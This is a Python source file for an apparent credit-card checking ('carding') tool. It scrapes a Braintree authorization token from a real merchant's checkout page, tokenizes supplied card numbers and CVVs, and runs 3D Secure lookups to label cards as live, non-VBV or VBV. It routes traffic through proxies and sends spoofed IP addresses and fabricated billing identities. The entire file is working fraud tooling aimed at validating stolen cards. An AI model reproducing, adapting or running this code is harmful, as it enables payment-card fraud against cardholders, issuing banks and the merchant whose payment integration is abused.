import aiohttp
import re
import json
import base64
import random
import asyncio
import time

# Cache the authorization fingerprint to avoid re-scraping the huge checkout page
_cached_fingerprint = None
_cache_expiry = 0

async def _get_auth_fingerprint(session, proxy_url=None):
    """Fetch and cache the Braintree authorization fingerprint."""
    global _cached_fingerprint, _cache_expiry
    
    now = time.time()
    if _cached_fingerprint and now < _cache_expiry:
        return _cached_fingerprint
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7827.91 Mobile Safari/537.36',
    }
    
    try:
        async with session.get('https://www.makistamps.com/checkout/', headers=headers, proxy=proxy_url) as r:
            resp_text = await r.text()
    except Exception:
        try:
            async with session.get('https://www.makistamps.com/checkout/', headers=headers) as r:
                resp_text = await r.text()
        except Exception as e:
            return None
    
    match = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', resp_text)
    if not match:
        return None
    
    try:
        decoded = base64.b64decode(match.group(1)).decode()
        data = json.loads(decoded)
        fp = data.get("authorizationFingerprint")
        if fp:
            _cached_fingerprint = fp
            _cache_expiry = now + 1500  # Cache for 25 minutes (token expires in ~30min)
        return fp
    except Exception:
        return None


async def process_braintree_vbv(cc, mm, yy, cvc, proxy_url=None):
    """
    Braintree GraphQL + 3DS Lookup.
    Returns: (is_live, message, response_text, receipt_url, amount)
    """
    def _format_proxy(p):
        if not p: return None
        ps = str(p).strip()
        if ps.startswith(("http://", "https://", "socks5://", "socks4://")): return ps
        parts = ps.split(":")
        if len(parts) == 4:
            if parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif parts[3].isdigit(): return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
            else: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
        return f"http://{ps}"

    proxy_url = _format_proxy(proxy_url)


    if len(yy) == 2:
        yy = "20" + yy
        
    bin_number = cc[:6]
    ipadd = f"{random.randint(11,250)}.{random.randint(11,250)}.{random.randint(11,250)}.{random.randint(11,250)}"

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            
            # 1. Get cached fingerprint (fast path) or scrape it
            authorization_fingerprint = await _get_auth_fingerprint(session, proxy_url)
            if not authorization_fingerprint:
                return False, "Failed to get Braintree Auth Token", "", None, "Auth ($0.00)"

            # 2. Tokenize via GraphQL (direct, no delay)
            headers_gql = {
                'authorization': f'Bearer {authorization_fingerprint}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA) AppleWebKit/537.36 Chrome/149.0.7827.91 Mobile Safari/537.36',
            }
            
            json_gql = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'dropin2',
                    'sessionId': '2d64cb82-f1a4-4084-bdd8-63df2991eadb',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc,
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            try:
                async with session.post('https://payments.braintree-api.com/graphql', headers=headers_gql, json=json_gql, proxy=proxy_url) as r:
                    gql_resp = await r.json()
            except Exception:
                async with session.post('https://payments.braintree-api.com/graphql', headers=headers_gql, json=json_gql) as r:
                    gql_resp = await r.json()
                    
            try:
                tokencc = gql_resp["data"]["tokenizeCreditCard"]["token"]
                # Extract BIN data from tokenize response
                card_data = gql_resp["data"]["tokenizeCreditCard"].get("creditCard", {})
                bin_data = card_data.get("binData", {})
            except Exception:
                if isinstance(gql_resp, dict) and 'errors' in gql_resp:
                    err = gql_resp['errors'][0].get('message', 'GraphQL Error')
                    return False, f"Tokenize Failed: {err}", str(gql_resp), None, "Auth ($0.00)"
                return False, "Failed to tokenize card", str(gql_resp), None, "Auth ($0.00)"

            # 3. 3DS Lookup (direct, no delay)
            headers_lookup = {
                'content-type': 'application/json',
                'origin': 'https://www.makistamps.com',
                'referer': 'https://www.makistamps.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA) AppleWebKit/537.36 Chrome/149.0.7827.91 Mobile Safari/537.36',
            }
            
            json_lookup = {
                'amount': '0.00',
                'browserColorDepth': 24,
                'browserJavaEnabled': False,
                'browserJavascriptEnabled': True,
                'browserLanguage': 'en-US',
                'browserScreenHeight': 965,
                'browserScreenWidth': 434,
                'browserTimeZone': -330,
                'deviceChannel': 'Browser',
                'additionalInfo': {
                    'ipAddress': ipadd,
                    'billingLine1': '123 Main Street',
                    'billingLine2': '',
                    'billingCity': 'New York',
                    'billingState': 'NY',
                    'billingPostalCode': '10001',
                    'billingCountryCode': 'US',
                    'billingPhoneNumber': '16023147676',
                    'billingGivenName': 'James',
                    'billingSurname': 'Smith',
                    'email': 'jamesmith9921@gmail.com',
                },
                'bin': bin_number,
                'dfReferenceId': '0_de6f19a7-7fbb-4b08-b3dc-49df96c87bbf',
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.133.0',
                    'cardinalDeviceDataCollectionTimeElapsed': 81217,
                    'issuerDeviceDataCollectionTimeElapsed': 9785,
                    'issuerDeviceDataCollectionResult': True,
                },
                'authorizationFingerprint': authorization_fingerprint,
                'braintreeLibraryVersion': 'braintree/web/3.133.0',
                '_meta': {
                    'merchantAppId': 'www.makistamps.com',
                    'platform': 'web',
                    'sdkVersion': '3.133.0',
                    'source': 'client',
                    'integration': 'custom',
                    'integrationType': 'custom',
                    'sessionId': '9668a9ca-d46a-477c-a120-d8b41523e16f',
                },
            }
            
            lookup_url = f'https://api.braintreegateway.com/merchants/5hgzqgpcndn3fs4y/client_api/v1/payment_methods/{tokencc}/three_d_secure/lookup'
            try:
                async with session.post(lookup_url, headers=headers_lookup, json=json_lookup, proxy=proxy_url) as r:
                    res_json = await r.json()
            except Exception:
                async with session.post(lookup_url, headers=headers_lookup, json=json_lookup) as r:
                    res_json = await r.json()

            # 4. Parse 3DS Status + BIN info
            try:
                statuscc = res_json["paymentMethod"]["threeDSecureInfo"]["status"]
                card_details = res_json.get("paymentMethod", {}).get("details", {})
                card_type = card_details.get("cardType", "Unknown")
                last_four = card_details.get("lastFour", "????")
                
                # Build BIN info dict for output
                bin_info = {
                    "bin": bin_number,
                    "card_type": card_type,
                    "issuing_bank": bin_data.get("issuingBank", "Unknown"),
                    "country": bin_data.get("countryOfIssuance", "Unknown"),
                    "prepaid": bin_data.get("prepaid", "Unknown"),
                    "debit": bin_data.get("debit", "Unknown"),
                    "commercial": bin_data.get("commercial", "Unknown"),
                }
                
                if statuscc in ['authenticate_successful', 'authenticate_attempt_successful', 'authenticate_successful_issuer_not_participating']:
                    return True, f"3DS Passed: {statuscc}", json.dumps(bin_info), None, "Auth ($0.00)"
                elif statuscc in ['lookup_not_enrolled', 'lookup_bypassed']:
                    return True, f"Non-VBV (Bypassed): {statuscc}", json.dumps(bin_info), None, "Auth ($0.00)"
                elif statuscc in ['challenge_required', 'authenticate_rejected']:
                    return False, f"VBV (Challenge Required): {statuscc}", json.dumps(bin_info), None, "Auth ($0.00)"
                elif statuscc == 'lookup_error':
                    return False, f"Lookup Error: {statuscc}", json.dumps(bin_info), None, "Auth ($0.00)"
                else:
                    return False, f"3DS Status: {statuscc}", json.dumps(bin_info), None, "Auth ($0.00)"
                     
            except KeyError:
                err_msg = res_json.get('error', {}).get('message', '3DS Lookup Failed')
                if 'error' not in res_json:
                    err_msg = str(res_json)
                return False, f"Failed: {err_msg}", str(res_json), None, "Auth ($0.00)"
                
    except Exception as e:
        return False, f"Error: {str(e)}", "", None, "Auth ($0.00)"
